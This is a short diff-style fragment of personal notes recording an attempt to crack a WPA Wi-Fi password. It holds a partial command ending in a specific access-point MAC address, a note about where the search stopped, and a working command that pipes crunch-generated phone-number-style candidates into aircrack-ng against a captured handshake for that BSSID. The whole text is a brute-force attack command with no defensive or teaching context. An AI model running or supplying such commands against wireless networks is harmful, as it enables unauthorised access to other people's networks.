@@ -1,0 +1,4 @@
+88:53:D4:E0:C5:C4 -c 1
+
+stoped at 0994019294
+crunch 10 10 -t 099%%%%%%% | aircrack-ng --bssid 88:53:D4:E0:C5:C4 -w- WPAcrack-01.cap
